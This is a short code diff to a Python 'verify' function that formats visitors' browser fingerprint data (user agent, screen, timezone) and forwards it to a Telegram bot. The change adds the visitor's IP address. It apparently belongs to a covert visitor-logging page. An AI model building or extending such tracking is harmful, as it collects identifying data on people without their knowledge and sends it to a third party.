@@ -52,6 +52,7 @@ def verify():
         f"📱 User-Agent: {data.get('userAgent', 'неизвестно')}\n"
         f"🖥 Экран: {data.get('screen', 'неизвестно')}\n"
         f"🌍 Часовой пояс: {data.get('timezone', 'неизвестно')}"
+        f"🌐 IP-адрес: {data.get('ip', 'неизвестно')}"
     )
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
